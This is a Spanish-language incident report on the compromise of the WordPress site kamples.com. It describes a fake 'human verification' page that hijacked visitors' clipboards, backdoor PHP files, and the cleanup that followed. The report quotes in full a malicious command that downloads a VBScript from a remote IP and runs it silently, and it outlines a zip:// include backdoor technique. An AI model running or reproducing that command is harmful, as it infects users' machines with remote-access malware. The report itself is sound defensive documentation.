# Reporte de Infección - Kamples.com

**Fecha:** 28 de Diciembre, 2025
**Estado:** Sitio desactivado a nivel de servidor (Nginx).

## Resumen del Incidente
El sitio web `kamples.com` fue comprometido por un ataque automatizado que reemplazó la página de inicio con una falsa verificación de "Cloudflare/Human Check" diseñada para distribuir malware a los visitantes (específicamente usuarios de Windows).

## Análisis Técnico de la Infección

### 1. Vector de Ataque Principal (`index.php`)
El archivo principal de WordPress `index.php` fue sobrescrito completamente.
- **Comportamiento**: Mostraba una página falsa de "Verificando si eres humano".
- **Payload (Carga útil)**:
  - Detectaba si el usuario usaba Windows.
  - Instruía al usuario a presionar `Windows + R`, luego `Ctrl + V` y `Enter`.
  - **Clipboard Hijacking**: El script copiaba un comando malicioso al portapapeles del usuario sin su consentimiento.

**Comando Inyectado:**
```powershell
cmd /c "curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%\dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%\dd.vbs && exit"
```
*Este comando descarga y ejecuta un script VBScript desde una IP remota (`198.13.158.127`), lo que probablemente instala un RAT (Remote Access Trojan) o Infostealer en la PC del visitante.*

### 2. Archivos Maliciosos Detectados (Backdoors)
Se encontraron múltiples archivos PHP que no forman parte de WordPress, utilizados probablemente como "puertas traseras" para mantener acceso al servidor:

- **`wp-confiq.php`**: Archivo de ~107KB imitando el legítimo `wp-config.php`.
- **`ma.php`**: Contenía código ofuscado y una referencia a `include("zip://ma#ma");`, una técnica avanzada para ejecutar código PHP oculto dentro de un archivo ZIP (o una imagen políglota).
- **`about.php`, `content.php`, `radio.php`**: Scripts PHP sospechosos en la raíz.
- **`.htaccess` modificado**: Se encontraron reglas para bloquear el acceso a archivos legítimos y proteger los archivos maliciosos.

### 3. Técnicas de Persistencia y Evasión
- **Obstrucción**: El `.htaccess` estaba configurado para denegar acceso a archivos `.php` comunes, excepto a una lista blanca que incluía los backdoors (`about.php`, `radio.php`, etc.).
- **Redirección**: El script en `index.php` intentaba redirigir a `t.me/Tarnkappe_info` si no se detectaba Windows, posiblemente para monetizar tráfico o estafas en Telegram.

## Acciones Realizadas

1. **Restauración de Archivos Principales**: Se restauró `index.php` y `.htaccess` a sus versiones originales de WordPress.
2. **Eliminación de Malware**: Se eliminaron los archivos `wp-confiq.php`, `ma.php`, `about.php` y otros sospechosos.
3. **Bloqueo del Sitio**: A petición del usuario, se ha desactivado el acceso público al sitio desde la configuración de Nginx para evitar más infecciones a visitantes.

## Recomendaciones para Reactivación
Antes de volver a habilitar el sitio, es CRÍTICO realizar:
1. **Reinstalación Limpia**: Reinstalar el núcleo de WordPress (`wp-admin`, `wp-includes`) desde cero.
2. **Auditoría de Plugins/Themes**: Revisar manualmente la carpeta `wp-content`. La infección de `ma.php` (zip wrapper) sugiere que pueden haber archivos maliciosos ocultos como imágenes.
3. **Cambio de Credenciales**: Cambiar claves de base de datos, usuarios administradores y acceso SSH/FTP.
